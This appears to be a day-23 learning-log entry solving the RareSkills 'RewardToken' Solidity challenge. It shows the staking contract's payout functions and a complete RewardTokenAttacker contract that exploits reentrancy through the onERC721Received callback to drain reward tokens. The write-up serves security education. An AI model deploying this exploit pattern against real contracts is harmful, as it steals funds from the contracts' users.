## Day 23

### RareSkills Riddles: RewardToken

In this challenge there is an ERC20 called RewardToken which is given to holders of an NFT.  The contract for staking is called: ```Depositoor``` and has a number of functions for claiming and withdrawing our tokens.  ```Depositoor``` starts with 100 tokens and we start with 1 NFT and our job is to drain ```Depositoor``` of all 100 tokens.  The token reward rate is 10tokens/day.  We could just deposit and wait for 10day, but let's see if there is a fast way.  Here are the functions for claiming earnings.  

```Java
    function claimEarnings(uint256 _tokenId) public {
        require(
            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
            "not your NFT"
        );
        payout(msg.sender);
        stakes[msg.sender].depositTime = block.timestamp;
    }

    function withdrawAndClaimEarnings(uint256 _tokenId) public {
        require(
            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
            "not your NFT"
        );
        payout(msg.sender);
        nft.safeTransferFrom(address(this), msg.sender, _tokenId);
        delete stakes[msg.sender];
    }

    function payout(address _a) private {
        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) *
            REWARD_RATE;

        if (amountToSend > 50e18) {
            amountToSend = 50e18;
        }
        if (amountToSend > rewardToken.balanceOf(address(this))) {
            amountToSend = rewardToken.balanceOf(address(this));
        }

        rewardToken.transfer(_a, amountToSend);
    }
```

One thing to note is that ```withdrawAndClaimEarnings()``` calls ```ERC721.safeTransferFrom()``` BEFORE deleting the stake struct, this sounds like our old friend the Reentrancy Attack.  Also note that the NFT transfer is done with ```safeTransferFrom()``` which requires the reciver to be an ```IERC721Receiver```.  

A contract that does this is given below.  

```Java
contract RewardTokenAttacker is IERC721Receiver {
    Depositoor private victim;
    NftToStake private nft;
    uint256 constant NFTNUM = 42;

    constructor() {}

    function setVictim(address _victimAdd, address _nftAdd) external {
        victim = Depositoor(_victimAdd);
        nft = NftToStake(_nftAdd);
        // stake
        nft.safeTransferFrom(address(this), _victimAdd, NFTNUM);
    }

    function attack() external {
        victim.withdrawAndClaimEarnings(NFTNUM);
    }

    //function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        require(msg.sender == address(nft), "wrong NFT");

        // now do a claimEarnings
        victim.claimEarnings(NFTNUM);

        return IERC721Receiver.onERC721Received.selector;
    }
}
```